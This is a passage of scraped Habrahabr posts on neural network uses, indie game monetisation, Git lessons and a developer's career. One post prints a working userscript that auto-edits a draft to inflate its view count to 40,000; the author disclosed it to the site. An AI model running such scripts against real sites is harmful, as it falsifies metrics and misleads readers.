нас есть либо данные с лиц, либо данные с картинок, либо данные с эмоциями с видеороликов. Если у нас этого нет, если мы не можем это отснять, как научить робота брать объекты? Это мы делаем автоматически — мы не знаем, как это работает. Другой пример: составлять большие базы данных в компьютерных играх сложно, да и не нужно, можно сделать гораздо проще. Все, наверное, слышали про успехи deep reinforcement learning в Atari и в го. Кто слышал про Atari? Ну кто-то слышал, хорошо. Про AlphaGo думаю слышали все, поэтому я даже не буду рассказывать, что конкретно там происходит. Что происходит в Atari? Слева как раз изображена архитектура этой нейронной сети. Она обучается, играя сама с собой для того, чтобы получить максимальное вознаграждение. Максимальное вознаграждение — это максимально быстрый исход игры с максимально большим счетом. Справа вверху — последний слой нейронной сети, который изображает всё количество состояний системы, которая играла сама против себя всего лишь в течении двух часов. Красным изображены желательные исходы игры с максимальным вознаграждением, а голубым — нежелательные. Сеть строит некое поле и движется по своим обученным слоям в то состояние, которого ей хочется достичь. В робототехнике ситуация состоит немного по-другому. Почему? Здесь у нас есть несколько сложностей. Во-первых, у нас не так много баз данных. Во-вторых, нам нужно координировать сразу три системы: восприятие робота, его действия с помощью манипуляторов и его память — то, что было сделано в предыдущем шаге и как это было сделано. В общем это все очень сложно. Дело в том, что ни одна нейронная сеть, даже deep learning на данный момент, не может справится с этой задачей достаточно эффективно, поэтому deep learning только исключительно кусочки того, что нужно сделать роботам. Например, недавно Сергей Левин предоставил систему, которая учит робота хватать объекты. Вот здесь показаны опыты, которые он проводил на своих 14 роботах-манипуляторах. Что здесь происходит? В этих тазиках, которые вы перед собой видите, различные объекты: ручки, ластики, кружки поменьше и побольше, тряпочки, разные текстуры, разной жесткости. Неясно, как научить робота захватывать их. В течении многих часов, а даже, вроде, недель, роботы тренировались, чтобы уметь захватывать эти предметы, составлялись по этому поводу базы данных. Базы данных — это некий отклик среды, который нам нужно накопить для того, чтобы иметь возможность обучить робота что-то делать в дальнейшем. В дальнейшем роботы будут обучаться на этом множестве состояний системы. Нестандартные применения нейронных сетей Это к сожалению, конец, у меня не много времени. Я расскажу про те нестандартные решения, которые сейчас есть и которые, по многим прогнозам, будут иметь некое приложение в будущем. Итак, ученые Стэнфорда недавно придумали очень необычное применение нейронной сети CNN для предсказания бедности. Что они сделали? На самом деле концепция очень проста. Дело в том, что в Африке уровень бедности зашкаливает за все мыслимые и немыслимые пределы. У них нет даже возможности собирать социальные демографические данные. Поэтому с 2005 года у нас вообще нет никаких данных о том, что там происходит. Учёные собирали дневные и ночные карты со спутников и скармливали их нейронной сети в течении некоторого времени. Нейронная сеть была преднастроена на ImageNet'е. То есть первые слои фильтров были настроены так, чтобы она умела распознавать уже какие-то совсем простые вещи, например, крыши домов, для поиска поселения на дневных картах. Затем дневные карты были сопоставлены с картами ночной освещенности того же участка поверхности для того, чтобы сказать, насколько есть деньги у населения, чтобы хотя бы освещать свои дома в течение ночного времени. Здесь вы видите результаты прогноза, построенного нейронной сетью. Прогноз был сделан с различным разрешением. И вы видите — самый последний кадр — реальные данные, собранные правительством Уганды в 2005 году. Можно заметить, что нейронная сеть составила достаточно точный прогноз, даже с небольшим сдвигом с 2005 года. Были конечно и побочные эффекты. Ученые, которые занимаются deep learning, всегда с удивлением обнаруживают разные побочные эффекты. Например, как те, что сеть научилась распознавать воду, леса, крупные строительные объекты, дороги — все это без учителей, без заранее построенных баз данных. Вообще полностью самостоятельно. Были некие слои, которые реагировали, например, на дороги. И последнее применение о котором я хотела бы поговорить — семантическая сегментация 3D изображений в медицине. Вообще medical imaging — это сложная область, с которой очень сложно работать. Для этого есть несколько причин. У нас очень мало баз данных. Не так легко найти картинку мозга, к тому же повреждённого, и взять ее тоже ниоткуда нельзя. Даже если у нас есть такая картинка, нужно взять медика и заставить его вручную размещать все многослойные изображения, что очень долго и крайне неэффективно. Не все медики имеют ресурсы для того, чтобы этим заниматься. Нужна очень высокая точность. Медицинская система не может ошибаться. При распознавании, например, котиков, не распознали — ничего страшного. А если мы не распознали опухоль, то это уже не очень хорошо. Здесь особо свирепые требования к надежности системы. Изображения в трехмерных элементах — вокселях, не в пикселях, что доставляет дополнительные сложности разработчикам систем. Но как обошли этот вопрос в данном случае? CNN была двупотоковая. Одна часть обрабатывала более нормальное разрешение, другая — чуть более ухудшенное разрешение для того, чтобы уменьшить количество слоёв, которые нам нужно обучать. За счёт этого немного сократилось время на тренировку сети. Где это применяется: определение повреждений после удара, для поиска опухоли в мозгу, в кардиологии для определения того, как работает сердце. Вот пример для определения объема плаценты. Автоматически это работает хорошо, но не настолько, чтобы это было выпущено в производство, поэтому пока только начинается. Есть несколько стартапов для создания таких систем медицинского зрения. Вообще в deep learning очень много стартапов в ближайшее время. Говорят, что venture capitalists в последние полгода выделили больше бюджета на стартапы обрасти deep learning, чем за прошедшие 5 лет. Эта область активно развивается, много интересных направлений. Мы с вами живем в интересное время. Если вы занимаетесь deep learning, то вам, наверное, пора открывать свой стартап. Ну на этом я, наверное, закруглюсь. Спасибо вам большое. Доклад: Нейронные сети — практическое применение."], "hab": ["Обработка изображений", "Машинное обучение", "Алгоритмы"]}{"url": "https://habrahabr.ru/post/322916/", "title": ["59 способов монетизировать вашу инди-игру", "перевод"], "text": ["У вас нет ни гроша? Питаетесь Дошираком? Отчаянно пытаетесь заработать пару баксов своим инди-детищем? Все мы были в точке невозврата в разработке, когда хотели получить какой-нибудь доход от игр, но не знали в какую сторону двигаться. На самом деле, иногда мы даже не представляли всех возможностей… Этот вопрос часто поднимается. Я постоянно получаю письма с вопросами «какая монетизация лучше?» или «сделать игру платной или использовать freemium?» Правда состоит в том, что вам надо проверить множество разных вещей. То, что сработало для вашей игры, может не работать для других и наоборот. И если подумать… Выложить игру на какой-нибудь портал и налить туда трафика — не лучший маркетинговый план. Я осознал, что большинство людей интересует не то, как продавать их игры, а то, как получить с них деньги. Итак, сегодня вам повезло. Я собрал список множества различных способов монетизации и получения дохода с ваших игр, и теперь вам не придётся снова спрашивать о возможных вариантах. Здесь описаны 59 способов монетизации инди-игр. Внутриигровые покупки Вероятно, это самая известная бизнес модель для мобильных игр. Free to play игры становятся только популярнее. Принцип прост: вы раздаёте игру бесплатно и продаёте игровые предметы, которые позволяют игроку получить новые впечатления. Эта модель является доминирующей в мобильных играх, а также распространена в социальных, MMO и даже некоторых PC-играх. Не спешите сразу отклонять её! Вот несколько идей для монетизации внутри игры: 1. Внутриигровая валюта. Все мы видели мобильные приложения или Facebook-игры, которые используют премиальную валюту. Идея проста: используйте простую зарабатываемую валюту в игре и добавьте отдельную покупаемую, которую можно тратить на игровые предметы. 2. Расходники. Один из лучших способов получения постоянного дохода. Если вы купили то, чем можно владеть вечно, теряется необходимость покупать это ещё раз. Расходники, наоборот, надо тратиться на них часто. 3. Праздничные предметы. Всегда лучше иметь повод, чтобы привлечь игроков. Предметы доступные по выходным и праздникам — это отличный способ не только напомнить игрокам о вашем существовании, но и отличная возможность создать дефицит, склоняя игрока к покупке. Таймеры с обратным отсчётом творят чудеса! 4. Случайные награды. Верите вы или нет, но добавив элемент случайности в награды, можно значительно повысить желание игрока получить определённый предмет. Случайные награды создают чувство предвкушения, и исследования показывают, что они затягивают значительно сильнее чем обычные награды, когда дело доходит до монетизации. 5. Заблокированные персонажи. Если позволить игроку пережить существующий опыт игры в роли другого персонажа, то можно извлечь чуть больше удовольствия от повторного прохождения игры. Наделяя дополнительных персонажей новым внешним видом, свойствами и способностями, вы можете усилить эффект и немного подзаработать. 6. Прокачка / кастомизация. В большинстве игр есть прокачка навыков и кастомизация персонажей. Игроки будут платить за сокращение времени, которое требует нужная им модернизация. Будьте осторожны, реализуя этот механизм в сетевой игре, остерегайтесь pay-to-win. 7. Дополнительные жизни/ходы. Если в вашей игре есть ходы или жизни, то отличное решение — вместо проигрыша предлагать игроку дополнительные жизни за премиальную валюту. Так как ключ к free-to-play модели — это предложение покупки в самый подходящий момент, такое решение определённо попадает в эту категорию. 8. Удвоение опыта/валюты. Технически решение относится к расходникам, но оно достаточно уникально, чтобы его выделить. Расходующийся предмет, который удваивает опыт, полученный за ограниченное время, или повышает количество собираемых монет, может считаться достаточно значимым. Существует множество игроков, которые ценят только те предметы, что позволяют экономить время. Дать им такую возможность — это выгодно, так как для них время дороже денег. 9. Ограниченная серия предметов. Эти предметы работают так же, как праздничные, за исключением того, что праздник не нужен. Продажа заранее определенного количества предметов означает, что их хватит не всем. Каждый раз, когда появляется минимальный запас ценных предметов, спрос идет вверх. Ограниченная серия — это отличный способ повысить спрос и продавать больше вещей. 10. Offer wall. Продавать игровые предметы и расходники — это круто… но то, КАК и КОГДА вы их продаёте, иногда более важно. Установка offer wall'а в правильном месте — это действительно эффективный способ заставить людей покупать ваши предметы. Когда игроки нажимают на предмет, который они хотят, но не могут себе позволить, показывайте offer wall. Когда игроки хотят использовать премиальный контент или DLC, показывайте offer wall. Offer wall, как доступ к контенту и предметам, значительно повышает конверсию и помогает заработать немного денег. Реклама Реклама существует почти также давно как и интернет и является одним из лучших способов заработка без единой траты со стороны игрока. Она довольно популярна среди инди-разработчиков из-за простоты использования и того, что сторонние сервисы берут на себя все мельчайшие детали. Большинство инди, особенно в мобильной разработке, считает рекламу своей основной стратегией монетизации. Вот несколько методов заработка с помощью рекламы: 1. Баннерная реклама. Наверное, один из самых используемых типов рекламы в играх. Баннерная реклама — это просто панелька в верху или низу экрана. Это отличный тип рекламы, но такие объявления потеряли свою прелесть за последние несколько лет. Когда игроки привыкают к ним, обьявления нажимаются меньше, следовательно заработок падает. С другой стороны, баннеры, наверное, самый простой тип рекламы для интеграции, особенно в мобильных играх. 2. Полноэкранная/межстраничная реклама. Такая реклама заполняет весь игровой экран на короткий период и закрывается. В отличие от обычных баннеров, которые могут примелькаться и уйти на задний план, межстраничные требуют уделить им внимание прежде чем продолжить. В результате они обычно лучше оплачиваются. Межстраничные объявления лучше всего использовать между уровнями или после нескольких потраченных жизней. 3. Видео реклама. Несмотря на то, что, как правило, видео реклама работает также как межстраничная, она значительно отличается тем, что требует от пользователя полного внимания. Если видео реклама сделана хорошо, то она конвертируется лучше статических аналогов. Наиболее рационально использовать её между уровнями или потерями нескольких жизней. 4. Реклама в нотификациях. Вероятно, самый раздражающий из всех типов рекламы. Я добавил её только, чтобы показать все возможные варианты. Такие объявления используют push-нотификации, чтобы захватить внимание пользователей и направить их куда-то. Например, это может быть какой-то offer wall или другой монетизируемый опыт, на Android устройствах можно отправить нотификацию в другое приложение или сайт. Рекламу в нотификациях можно использовать даже на PC в Html5-играх. 5. Реклама при выходе из игры. Отличная практика — показывать рекламу перед выходом, когда игроки уже готовы покинуть игру. Представьте, что кто-то закончил играть в вашу игру, в этом случае он гораздо вероятнее кликнет на рекламу, чтобы перейти к следующему развлечению. В этот идеальный момент можно подсунуть пользователю рекламу другой игры. 6. Реклама других игр / CPI. Когда вы делаете игру, скорее всего, есть и другие люди, которые делают подобные игры, привлекательные для вашей аудитории. Это отличный шанс либо заработать денег, либо договориться о взаимном продвижении с другим разработчиком. Простой пункт меню с текстом «больше игр», который ведёт к играм партнёров, будет хорошим дополнением. Если вы продвигаете чужую игру через рекламную сеть, вы зарабатываете по CPI-модели, что расшифровывается как cost per install. 7. Реклама при скачивании. Правда, этот способ я видел не часто и не знаю почему. Существует множество сервисов, которые позволяют зарабатывать деньги за посещение ссылки, показывая пользователю рекламу 5 секунд. Такие сервисы отлично подходят для Html5 игр или маленьких затягивающих игр. Можно раздавать игру бесплатно, но получать с неё небольшой доход. Партнёрские отношения Вероятно, это один из самых недооцененных и недостаточно используемых методов монетизации игры, особенно в инди-играх. Партнерства позволяют получить прибыль авансом до завершения вашей игры. В некоторых случаях они позволяют получить деньги до того как игра будет закончена или даже до начала разработки, зависит от партнёра. Вот несколько способов монетизации партнёрства, которые я собрал за последние несколько лет: 1. Рекламные игры. Вы можете делать игры, которые полностью являются рекламой партнёра. Например, сайт Burger King или старые игры Cap'n Crunch, которые шли в коробках с хлопьями. Партнёрство с компанией требует много инициативы и немного опыта продаж, но это проще чем кажется. 2. Рекламные предметы / персонажи. Они отличаются от продаваемых предметов в free-to-play игре, так как эти предметы бесплатны для игрока. Например, вы создаёте игру о верховой езде. Тогда вы обращаетесь к компании, как Levi's jeans, и заставляете спонсировать дополнительного всадника с их логотипом. Это очень хорошо работает с маленькими или средними брендами и очень нишевыми продуктами. 3. Продвижение платных игр. Путь похож на CPI за исключением того, что вы идёте напрямую к владельцу игры и заключаете сделку, X$ за Y установок/дней/просмотров. Лучше получается с быстро растущими играми или с маленькими, которые пытаются закрепиться. 4. Партнёрские предложения / купоны. Партнёрское предложение заключаются в том, что кто-то владеет продуктом или сервисом, а вы заставляете своих пользователей купить их продукт и получаете комиссию. Партнёрские предложения работают действительно хорошо тогда, когда они точно таргетированы. Предположим, ваша игра — военный симулятор, тогда отлично подойдёт партнерское предложение чего-то похожего. Если вы создаёте обучающую игру, вероятно, вам подойдут предложения учебных материалов. Надеюсь, суть понятна. Часто такие предложения могут быть оформлены в виде купонов, например, пользователь может получить месяц бесплатного доступа к Netflix, используя ваш промокод. Пользователи получают награду, вы — комиссию, все в выигрыше. 5. Бесплатно с покупкой. Тут все просто… если у вас есть другие продукты, сервисы или игры, почему бы не раздавать вашу игру как бесплатный бонус к покупке? Дополнительные стимулы работают точно так же, как скидки, и они работают еще лучше, если вы ограничиваете срок предложения. 6. Опросы. Существуют компании, которые платят за каждого, кто пройдёт их опрос. Это действительно классный и уникальный способ монетизации. В зависимости от стиля вашей игры, он может стать отличным дополнением вашей бизнес модели. 7. Инвесторы. Я должен внести ясность, вы никогда не должны считать деньги инвесторов самостоятельным способом монетизации. Тем не менее, инвесторы могут помочь сделать игру лучше, оплачивать ваши счета, пока вы делаете её, и имеют множество связей. Я включил этот пункт, так как много инди-разработчиков учитывают возможность оплаты счетов пока они делают игры. 8. Бандлы инди игр. Партнёрство с одним из инди-бандлов — это отличный способ обеспечить некоторую видимость и заработать немного денег. Обычно бандлы позволяют пользователям платить столько сколько хочется и делят доход между разработчиками. Это хороший способ получить немного денег с вашей старой игры, или поддержать дело, в которое вы верите. Однако, я бы не рекомендовал использовать этот способ в период запуска игры. 9. Лицензирование. Если вы делаете Html5, веб или по старинке flash-игры, вы можете лицензировать свои игры веб порталам. Эти ребята будут платить вам авансом, как правило, несколько тысяч долларов. После этого они получают определенные права на игру на заданный период времени (обычно для заработка с рекламы). 10. Брендирование. Подобно лицензированию, брендирование позволяет получить от партнёра кучу денег авансом, но он получит только переименованную копию игры или её рескин. Брендирование, как правило, позволяет партнёру использовать свою версию игры только для конкретной цели (например, для мероприятий). Платные игры Один из испытанных и надежных методов заработать денег на вашей инди-игре — это просто сделать её платной. Существует несколько разных способов продать игру, о которых вы могли даже не догадываться. Вот несколько из них: 1. Обычная продажа. Старый добрый способ, ничего особенного. Вы отправляете игру на продажу, кто-то даёт вам денег и получает возможность загрузки игры. Это относится как к самостоятельным продажам на своём сайте, так и к магазинам, таким как Steam. 2. Множество игровых порталов. То же, что и обычные продажи, но, верите или нет, большинство разработчиков забывают разместить игру на более чем одном портале. Steam хорош, но существует куча других платформ распространения. И чем больше людей увидит игру, тем лучше, не так ли? Особенно это относится к Html5 и веб-играм, для которых существуют сотни порталов. 3. Платное удаление рекламы. Способ часто встречается в мобильных играх. Бесплатная версия распространяется с рекламой, но вы можете заплатить 1$ или около того, чтобы отключить её. Очень хорошо подходит играм основанным на рекордах, или играм с большой реиграбельностью. 4. Премиум версия. Продажа премиум версии игры схожа с продажей отключения рекламы за исключением того, что игроки платят за разблокировку премиальных возможностей игры, за увеличение объёма хранилищ и тому подобное. Идеально подходит для функциональных приложений, но я встречал реализации в играх. Этот способ часто называют freemium-моделью, когда базовая версия бесплатна, но за премиум надо платить. 5. Дополнительный платный контент / DLC. Это чрезвычайно распространённый способ, особенно для консольных и PC-игр. Вы уже запустили игру и берёте деньги за новый контент, сюжетные линии, оружие, механизмы итп. Это самая распространенная форма монетизации после запуска. 6. Многосерийные игры. Аналогично DLC, но вы продаёте игру по частям. Вместо одной игры за 20$, у вас может быть 5 эпизодов по 4$ каждый. Идеально подходит для сюжетных и приключенческих игр из-за большого коэффициента удержания. 7. Продажа исходного кода. Многие разработчики делают проекты мечты, которые стремятся быть очень уникальным и нишевыми. Исходный код таких игр плохо продаётся. Но, если вы делаете аркадные или казуальные мобильные игры, вы можете получить очень хорошие деньги за продажу исходников, позволяя другим публиковать изменённые версии вашей игры. Существуют торговые площадки, где вы можете разместить свой код и продавать его, как в обычном интернет-магазине. 8. Подписка. Большие MMO или игры с исключительными значениями коэффициента удержания придерживаются этого метода заработка. Если люди любят вашу игру, и они играют постоянно, подписка может оказаться хорошей идеей. Игра может требовать подписку для запуска, или может использовать гибридную модель freemium-подписки, когда игра бесплатна, но для получения дополнительного контента/привилегий/предметов следует подписаться. 9. Предзаказ / crowd funding. Так же как и с инвесторами, не стоит рассматривать предзаказы как единственный способ монетизации. Но как я уже говорил, если вы рассчитываете оплачивать ваши счета в то время как делаете игру своей мечты, это поможет. Предзаказ и crowd funding кампании позволяют продавать игры заранее, только удостоверьтесь, что сможете их предоставить. Биллинг Стоит заранее продумать то, как вы будете получать платежи, однако много инди откладывают решение до конца. Способы оплаты и процесс, через который проходит игрок, чтобы перечислить вам деньги, чрезвычайно важен. Следует рассчитать и спланировать весь путь от первого впечатления до удовлетворения покупателя. Ниже приведены несколько способов, которые могут помочь монетизировать ваши игры: 1. Несколько способов оплаты. Bitcoin / PayPal / Apple Pay / Google Wallet — способы получения платежей, которые являются одними из самых недооценённых, но эффективных методов увеличения конверсии. Естественно, чем проще сделать платёж, тем больше вероятность, что кто-то его проведёт. Не способ монетизации, конечно, но все равно очень важный пункт. 2. Биллинг сотового оператора. Частный случай предыдущего пункта, но предназначен специально для мобильных, а также гораздо эффективнее. Оплата с помощью сотового оператора гораздо проще чем вход в личный кабинет или ввод данных карты. Он эффективен в таких странах как Бразилия, где, как правило, не используют кредитные карты. 3. Ваучеры / Подарочные сертификаты. Позволять пользователям покупать время/монеты/жизни для друзей или родственников в виде ваучера — это отличный способ получения небольшого дополнительного дохода вне зависимости от выбранной бизнес модели. Ваша игра должна быть хорошей и популярной, чтобы этот механизм заработал, но если вы справитесь, он будет действовать эффективно. Ваучеры можно даже распространять через другие ваши игры, если вы уже собрали библиотеку. 4. Демо-версия / пробный период. В индустрии редко встречается метод, когда пользователю предоставляется бесплатный пробный период или демо-версия игры с возможностью покупки полной. Лучше всего сначала собрать данные кредитной карты, а деньги списывать автоматически по истечении пробного периода. Часто этот способ применяют в MMO-играх с подпиской. В них запуск бесплатного периода требует данные карты, так как вам автоматически будет выставлен счёт, если вы не откажетесь. Конечно, чтобы использовать этот метод, вы должны иметь действительно великолепную игру с очень высоким коэффициентом удержания. Данные Ещё один способ монетизации, который совершенно игнорируют большинство инди-разработчиков, тогда как он может быть самым доходным для популярных игр. Продавать, сдавать и использовать данные для получения дохода — просто и понятно. Он требует немного опыта продаж и некоторых навыков работы с людьми, тем не менее это отличный способ монетизации. Вот несколько советов, как превратить данные в деньги: 1. Email регистрация. Запрашивая адрес почты при регистрации, вы получаете возможность связаться с пользователем напрямую. Её можно монетизировать множеством способов, например, отправлять информацию о предложениях партнёров, мерчендайзе, DLC или будущих играх. 2. SMS маркетинг. Так же как и с почтой, но теперь у вас есть номер их телефона. Будьте очень осторожны и спрашивайте разрешение, так как с этим видом маркетинга вы легко можете попасть в неприятную ситуацию, если будете использовать его неправильно. Тем не менее, при правильном использовании, метод чрезвычайно эффективен, та как SMS-сообщения имеют коэффициент открытия более 90%. 3. Продажа данных. Информация о пользователях, такая как адрес электронной почты и номер телефона, является очень ценной для компаний, ориентированных на те же демографические группы, или для других игр, которые хотят больше игроков. Вы можете заключить сделку по продаже данных напрямую. 4. Аренда доступа к пользователям. Вместо того, чтобы продавать данные (расстраивая этим пользователей), вы можете давать доступ к вашей базе пользователей за вознаграждение. Вам могут платить за отправку от их имени почтовых или текстовых сообщений, с продвижением их игр, продуктов или сервисов. Сетевая игра Способы получения дохода с сетевых игр иногда отличаются от вариантов, которые используют для однопользовательских игр. Когда появляется множество вовлечённых людей, меняется психология траты денег игроками. С этими изменениями идёт большой потенциал монетизации. Вот несколько идей: 1. Подарки. Когда ваша игра вращается вокруг команд или конкурентной игры, возможность предоставить другу свои вещи или ресурсы является большим стимулом, чтобы фактически купить их у вас. Нам всем нужно дружить, не так ли? 2. Торговля. Аналогично подаркам, но чем больше вариантов использования предметов и ресурсов, тем более ценными они становятся. А чем более они ценны, тем чаще игроки будут покупать их за реальные деньги. 3. Конкурсы / турниры. Введение номинальной платы за участие в сетевом турнире с реальными призами — это совершенно недооценённый метод монетизации. Турниры отлично подходят для некоторых игр, они могут повторяться еженедельно или ежемесячно, при этом игроки никогда не устанут от этого. 4. Ставки / пари. Аналогично подаркам и торговле, но с добавлением навыков и соперничества для стимулирования покупки. Если игроки могут ставить предметы на исход, который могут контролировать, то они гораздо вероятнее запасаются премиум вещами. Во-первых, чтобы повысить свои шансы победить, а также для повышения ставок. 5. Пользовательский контент. Плата за редактор уровней или доступ к порталу пользовательского контента подходит для заработка с минимальными усилиями. Также вы можете раздавать этот контент бесплатно владельцам игры, повышая время игры, реиграбельность и количество продаж. 6. Социальные сети. Если вы делаете Html5 или веб-игры, вы можете разместить их в социальных сетях. Сети, такие как Facebook, располагают очень простыми в использовании инструментами, которые позволяют легко встроить ваши игры и извлечь выгоду из огромной базы игроков. Лучше всего совмещать этот вид монетизации с freemium моделью или методами сетевых игр. Сопутствующие товары Производить посторонние вещи для продажи не всегда осмысленно, особенно, если вы новый разработчик, и у вас нет большой аудитории. Также мерчандайз материален, значит стоит денег для производства, а инди не особо славятся их избытком. Но, если ваша игра существует продолжительное время, или у вас есть море фанатов, мерчандайз выведет ваш доход на новый уровень. Вот несколько вариантов того, что можно сделать: 1. Товар-приманка. Эта тактика часто используется в универмагах и офисных зданиях. Продукт раздается бесплатно или значительно ниже рыночной стоимости. Цена должна быть достаточно низкой, чтобы это могло привлечь внимание. Куча людей начинает звонить или приходить, и, как правило, покупать дополнительно что-нибудь еще. Если у вас есть много игр, замечательная идея использовать одну из них как товар-приманку для продвижения или стимулирования покупки других продуктов или сервисов. 2. Периферийные устройства. Некоторые игры требуют специальный контроллер или устройство. Вы можете раздавать игру бесплатно тем, кто купил контроллер. 3. Специальные коробочные издания. Если люди любят вашу игру, то хорошей идеей будет выпуск специального издания на физическом носителе. Во время запуска или через год вместе с DLC, в любом случае, вы сможете получить несколько лишних долларов с игр, которые продаются. 4. Обои. Если в вашей игре есть культовые персонажи, декорации или художественные стили, то продажа обоев это крайне недооценённый способ заработка. Лучше всего подходит нишевым или очень стильным играм с небольшой, но страстной аудиторией. 5. Рингтоны. Аналогично обоям, но про музыку. Если у игры культовый саундтрек (например, как Hotline Miami), вы можете продавать рингтоны. Ещё раз, подходит стильным и нишевым играм с увлечёнными игроками. 6. Брелки. Вы можете очень дёшево сделать брелки оптом на заказ и продавать их супер фанатам. У каждого есть ключи, почему бы не повестить на них брелок? 7. Футболки. Изготавливаются ещё проще чем брелки, с помощью специальных сервисов вы можете проверить спрос на них, даже до создания. Такие сервисы помогут вам сэкономить на первой партии. Каждая футболка делается по запросу, поэтому вы автоматически оказываетесь в плюсе. 8. Чехлы для телефонов. Опять же, очень просто заказать, они дешевы, они любимы, и часто используются почти всеми. Если у вас есть милые персонажи или отличные арты, это то, что нужно для фанатов. 9. Плюшевые игрушки. Значительно лучше подходят, если ваша игра ориентирована на детей или любителей плюшевых игрушек. Как Angry Birds, если у вас есть привлекательные герои, из них получатся отличные плюшевые приятели, а фанаты их любят! Заключение Вот и все! Существуют сотни способов монетизации вашей игры, поэтому не думайте, что никогда не сможете заработать. Все возможно, просто требуется немного работы и экспериментов. Учитывайте платформу, которую используете, и всегда обращайте внимание на то, какие методы лучше всего работают конкретно в вашей игре. Я что-то упустил? Если так, или у вас есть дополнения, оставьте комментарий внизу!"], "hab": ["Разработка игр"]}{"url": "https://habrahabr.ru/post/322424/", "title": ["Серия видеоуроков по Git для новичков", "tutorial"], "text": ["Скорее всего, если вас привлекло название статьи, то вы начинаете свой путь знакомства с системой контроля версий Git. В данной статье я приведу 10+ видео о пошаговом вхождении в контроль версии используя Git. Данного курса будет вполне чем достаточно для работы с такими популярными сервисами как GitHub и Bitbucket. Однажды мой знакомый, который только начинал свой путь в ИТ кинул мне данный мемчик что слева, с вопросом \"А чем плохо то?\", поэтому чтобы понимать данную шутку и уметь работать с самым популярным на сегодня VCS (Version Control System) рекомендую к ознакомлению серии видеоуроков, которую я привел ниже. Прежде хочу сказать, что серия по Git не завершена и новые видео активно публикуются каждую неделю. Для тех кто желает следить за серией прошу перейти в плейлист по Git куда добавляются новые видео. Содержание: Урок 0. Подготовка и Введение Урок 1. Первый коммит Урок 2. Проверка состояния Урок 3. Индексация файлов Урок 4. История коммитов Урок 5. Git checkout - Назад в будущее Урок 6. Отмена индексированных файлов Урок 7. Revert - Отмена коммита Урок 8. Решение простого конфликта Урок 9. Ветки и их применение Урок 10. Слияние веток и решение конфликтов слияния Урок 11. Rebase vs. Merge - Что такое git rebase? Очень надеюсь данная серия видео кому-то поможет изучить Git либо улучшить его понимание. Приятного изучения!"], "hab": ["GitHub", "Git"]}{"url": "https://habrahabr.ru/post/322272/", "title": ["Как накрутить 40к просмотров на Хабрахабр. Баг или фича?"], "text": ["Всем доброго времени суток, скриншот выше сделан как раз перед публикацией статьи, о нём сегодня и пойдёт речь. В процессе создания и публикации статей на Хабре, я заметил одну очень интересную особенность работы счетчика просмотров. Заключалась она в том, что каждый раз при любом редактировании статьи, которая ещё не опубликована и сохранена как черновик, счётчик каждый раз увеличивается на +1. Получалось, что к примеру к моменту публикации, статья уже могла иметь от 1 до N просмотров. Я решил проверить свою догадку, и создал тестовую статью, которую сохранил как черновик: Вносим несколько изменений, каждый раз сохраняя статью, чтобы удостовериться в том, что счетчик просмотров действительно увеличивается: Хорошо, а что если создать скрипт, который будет делать тоже самое, но без участия пользователя? Наиболее простым вариантом тут было бы использовать JavaScript и запустить исполнение прямо в браузере. Скачав плагин Tampermonkey, я набросал в нём небольшой скрипт: // ==UserScript== // @name New Userscript // @namespace http://tampermonkey.net/ // @version 0.1 // @description try to take over the world! // @author You // @match https://habrahabr.ru/* // @grant none // ==/UserScript== var postID = 322272; (function() { 'use strict'; // Your code here... setInterval(fakeEdit, 1000); })(); function fakeEdit() { if (location.href.indexOf('post/' + postID.toString()) > 0) location.href = 'https://habrahabr.ru/topic/edit/' + postID.toString() + '/'; else { text = document.getElementById('text_textarea'); text.value = Math.random().toString(36).substring(2) +'\\n'+ Math.random().toString(36).substring(2); to_draft = document.getElementsByName('draft')[0]; to_draft.click(); } } Что тут происходит: Мы запускаем бесконечный цикл с интервалом итерации в 1 секунду, цикл в свою очередь выполняет функцию fakeEdit Функция fakeEdit проверяет текущий адрес страницы: 2.1. если на данный момент это страница редактирования, то мы изменяем содержимое поля text_textarea, в котором как раз расположен текст статьи, затем имитирует сохранение, путём клика по кнопке «В черновики»; 2.2. если адрес текущей страницы содержит post, то переходим к редактированию статьи Таймаут тут нужен, для того, чтобы после загрузки страницы, все элементы успели прогрузиться. Запускаем и оставляем его на несколько дней. В результате через небольшой промежуток времени получаем примерно вот такой результат: Я не считаю описанное выше мной — уязвимостью, но всё же перед публикацией этой статьи, уведомил администрацию Хабра о таком нестандартном поведении счётчика, и вот их ответ: Здравствуйте! Приносим извинения за задержку с ответом. Счетчик просмотров, действительно, считает не только уникальные просмотры (собственно, как и подобные счетчики на большинстве ресурсов в сети Интернет). До вашего обращения нам не приходило в голову рассматривать это как уязвимость, ведь злоупотребить этим в нашем сообществе довольно трудно: если плохой материал попадет в «самое читаемое», то привлечет внимание большого числа пользователей, которые, в свою очередь, «сольют» рейтинг материала и карму автора, так что он сам себя накажет, а если попадет хороший, то и не жалко. Конечно каждый решает сам, использовать полученные знания или нет, но главное помнить, что у всего есть последствия. Я решил остановить скрипт на 40000 просмотрах, но вопрос о том есть ли предел, всё ещё остаётся, а так же что произойдёт при превышении этого передела?"], "hab": ["Тестирование веб-сервисов"]}{"url": "https://habrahabr.ru/company/yamoney/blog/322968/", "title": ["Круглое нести, квадратное катить: история джависта"], "text": ["Считается, что в детстве формируется наша будущая специальность. Любители собирать головоломки должны попасть в ученые, программисты или шифровальщики, а тем, у кого есть способности к рисованию, прямой путь в дизайнеры или художники. Но мы почему-то делаем все возможное, чтобы «что-то пошло не так». Сейчас я работаю программистом в Яндекс.Деньгах и занимаюсь интеграцией с транспортными решениями. Можно подумать, что я — джавист в пятом поколении, с вытянутым свитером и бородой до пояса. Но все еще интереснее, ведь карьера моя началась с журналистики. Любишь программировать — иди в журналисты Создавать приложения мне нравилось с детства, поэтому любимым домашним хобби было изучение Бейсика и TurboPascal на популярном в те времена i486. Еще участвовал в школьных олимпиадах по программированию и уделял особое внимание домашним заданиям по информатике. В общем, явно будущий программер — что вообще может пойти не так? Помните, как поступали в первый ВУЗ и, главное, зачем? Я вот был не уверен в собственных силах, ведь требования серьезных университетов тогда казались невероятными. Впрочем, все эти страшилки про сложность поступления и завышенные ожидания вы и так наверняка слышали. В общем, я пошел по пути наименьшего сопротивления и поступил на факультет журналистики. Но и тут меня потянуло к инженерной деятельности: я стал заниматься техникой печати и оформлением периодических изданий. Со второго курса попал в лабораторию визуальных коммуникаций и информационных технологий при факультете, где стал потихоньку админить местный IT-парк. В то время как раз набирали популярность идеи удаленного обучения, и в нашем университете решили сделать электронное учебное пособие для подготовки радиожурналистов, с видео- и аудиоматериалами. Я как раз отвечал за реализацию «движка» на базе HTML и JS. Это был первый серьезный опыт разработки реального веб-приложения, которое в дальнейшем мы еще долго 